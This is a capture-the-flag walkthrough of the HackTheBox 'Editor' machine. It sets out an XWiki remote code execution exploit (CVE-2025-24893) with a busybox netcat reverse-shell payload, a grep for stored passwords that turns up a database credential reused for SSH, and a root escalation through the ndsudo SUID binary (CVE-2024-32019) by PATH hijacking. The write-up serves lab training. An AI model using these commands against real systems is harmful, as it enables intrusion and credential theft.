# HackTheBox - Editor
OS: Linux
Difficulty: Easy

## Recon
Nmap revealed an open HTTP service on port 80 (doesn't respond) and port 8080.

The application on 8080 is the XWiki default page

## Exploitation - XWiki RCE
CVE-2025-24893 (https://github.com/gunzf0x/CVE-2025-24893) applies to our case.
1. Start a listenner:
```bash
nc -lnvp 4444
```

2. Run the remote code execution :
```bash
python3 CVE-2025-24893.py -t 'http://10.10.11.80:8080/xwiki/bin/view/Main/' -c 'busybox nc <IP> <PORT> -e /bin/bash'
```

## Getting user
1. After gaining command execution, inspect XWiki files :
```bash
cat * | grep -i pass
```

Example discovered entries:
```
<property name="hibernate.connection.password">theEd1t0rTeam99</property>
```

2. Enumerate home directories and users:
```bash
ls /home
```
If an account (oliver) exists and the discovered password, SSH may succeed:
```bash
ssh oliver@10.10.11.80
```

## ndsudo CVE
1. Find SUID binaries :
```bash
find / -type f -perm -4000 2> /dev/null
```
Look for unusual SUID binaries. On this box:
```
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
```

2. CVE lookup: ndsudo has a local privilege escalation (CVE-2024-32019 - https://sploitus.com/exploit?id=5077683C-F7E6-58BE-9375-B5A13A8782C5).


3. Build the PoC locally and transfer it to the target (example):
```bash
gcc poc.c -o nvme

scp nvme oliver@10.10.11.80:/tmp/
```

4. On the target:
```bash
chmod +x /tmp/nvme
export PATH=/tmp:$PATH
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
```

We get a root shell.